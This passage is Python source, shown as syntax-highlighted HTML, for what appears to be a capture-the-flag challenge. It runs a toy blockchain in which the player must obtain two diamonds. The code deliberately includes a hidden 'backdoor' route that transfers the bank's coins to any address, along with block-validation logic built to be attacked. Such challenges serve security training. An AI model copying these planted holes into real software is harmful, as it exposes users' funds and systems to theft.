            has_attrs<span class="token punctuation">(</span>utxo<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> new_utxo_ids<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"output utxo of same id({}) already exists."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            new_utxo_ids<span class="token punctuation">.</span>add<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of amount of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid amount of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of address of output utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                addr_to_pubkey<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid type of address({})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
        tot_output <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo ids in tx should be array"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo signatures in tx should be array"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"lengths of arrays of ids and signatures of input utxos should be the same"</span><span class="token punctuation">)</span>
        tot_input <span class="token operator">=</span> <span class="token number">0</span>
        tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> utxo_id<span class="token punctuation">,</span> signature <span class="token keyword">in</span> zip<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of input utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> utxo_id <span class="token operator">not</span> <span class="token keyword">in</span> utxos<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid id of input utxo. Input utxo({}) does not exist or it has been consumed."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
            utxo <span class="token operator">=</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
            <span class="token keyword">if</span> type<span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of signature of input utxo"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> verify_utxo_signature<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Signature of input utxo is not valid. You are not the owner of this input utxo({})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
            tot_input <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
            <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>
        <span class="token keyword">if</span> tot_output <span class="token operator">></span> tot_input<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"You don't have enough amount of DDCoins in the input utxo! {}/{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tot_input<span class="token punctuation">,</span> tot_output<span class="token punctuation">)</span><span class="token punctuation">)</span>
        tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>

    block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    block_hash <span class="token operator">=</span> int<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block_hash <span class="token operator">></span> difficulty<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please provide a valid Proof-of-Work'</span><span class="token punctuation">)</span>
    block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> tail<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'A same block is already in the blockchain'</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> block
    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token comment" spellcheck="true"># First, the bank issued some DDCoins ...</span>
        total_currency_issued <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
        genesis_transaction <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create DDCoins from nothing</span>
        genesis_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>EMPTY_HASH<span class="token punctuation">,</span> <span class="token string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>genesis_transaction<span class="token punctuation">]</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span>
        genesis_block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block

        <span class="token comment" spellcheck="true"># Then, the bank was hacked by the hacker ...</span>
        handout <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>hacker_address<span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>
        reserved <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        transferred <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>handout<span class="token punctuation">,</span> reserved<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
        second_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'HAHA, I AM THE BANK NOW!'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>second_block<span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># Can you buy 2 diamonds using all DDCoins?</span>
        third_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>second_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'a empty block'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>third_block<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_balance_of_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    tail <span class="token operator">=</span> find_blockchain_tail<span class="token punctuation">(</span><span class="token punctuation">)</span>
    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>
    <span class="token keyword">return</span> calculate_balance<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">homepage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    announcement <span class="token operator">=</span> <span class="token string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>
    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    genesis_block_info <span class="token operator">=</span> <span class="token string">'hash of genesis block: '</span> <span class="token operator">+</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
    addr_info <span class="token operator">=</span> <span class="token string">'the bank\'s addr: '</span> <span class="token operator">+</span> bank_address <span class="token operator">+</span> <span class="token string">', the hacker\'s addr: '</span> <span class="token operator">+</span> hacker_address <span class="token operator">+</span> <span class="token string">', the shop\'s addr: '</span> <span class="token operator">+</span> shop_address
    balance_info <span class="token operator">=</span> <span class="token string">'Balance of all addresses: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>balance<span class="token punctuation">)</span>
    utxo_info <span class="token operator">=</span> <span class="token string">'All utxos: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span>
    blockchain_info <span class="token operator">=</span> <span class="token string">'Blockchain Explorer: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    view_source_code_link <span class="token operator">=</span> <span class="token string">"&lt;a href='source_code'>View source code&lt;/a>"</span>
    <span class="token keyword">return</span> announcement<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;br />&lt;br />\r\n\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>view_source_code_link<span class="token punctuation">,</span> genesis_block_info<span class="token punctuation">,</span> addr_info<span class="token punctuation">,</span> balance_info<span class="token punctuation">,</span> utxo_info<span class="token punctuation">,</span> blockchain_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> shop_address

<span class="token keyword">def</span> <span class="token function">find_enough_utxos</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    collected <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">==</span> addr_from<span class="token punctuation">:</span>
            amount <span class="token operator">-=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
            collected<span class="token punctuation">.</span>append<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> collected<span class="token punctuation">,</span> <span class="token operator">-</span>amount
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'no enough DDCoins in '</span> <span class="token operator">+</span> addr_from<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    input_utxo_ids<span class="token punctuation">,</span> the_change <span class="token operator">=</span> find_enough_utxos<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>
    outputs <span class="token operator">=</span> <span class="token punctuation">[</span>create_output_utxo<span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> the_change <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        outputs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>create_output_utxo<span class="token punctuation">(</span>addr_from<span class="token punctuation">,</span> the_change<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> create_tx<span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">free_ddcoin</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'The bank has no money now.'</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        address <span class="token operator">=</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span>
        addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># to check if it is a valid address</span>
        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> bank_address<span class="token punctuation">,</span> address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b@cKd00R tr1993ReD'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
        <span class="token keyword">return</span> str<span class="token punctuation">(</span>balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' DDCoins are successfully sent to '</span> <span class="token operator">+</span> address
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'ERROR: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>

DIFFICULTY <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'00000'</span> <span class="token operator">+</span> <span class="token string">'f'</span> <span class="token operator">*</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/create_transaction'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create_tx_and_check_shop_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        block <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>block<span class="token punctuation">,</span> DIFFICULTY<span class="token punctuation">)</span>
        msg <span class="token operator">=</span> <span class="token string">'transaction finished.'</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>

    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1000000</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># when 1000000 DDCoins are received, the shop will give you a diamond</span>
        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># and immediately the shop will store the money somewhere safe.</span>
        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> shop_address<span class="token punctuation">,</span> shop_wallet_address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span><span class="token punctuation">,</span> shop_privkey<span class="token punctuation">)</span>
        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'save the DDCoins in a cold wallet'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
        msg <span class="token operator">+=</span> <span class="token string">' You receive a diamond.'</span>
    <span class="token keyword">return</span> msg


<span class="token comment" spellcheck="true"># if you mess up the blockchain, use this to reset the blockchain.</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/reset'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">reset_blockchain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token string">'genesis_block_hash'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">'reset.'</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/source_code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_source_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'serve.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
    html <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
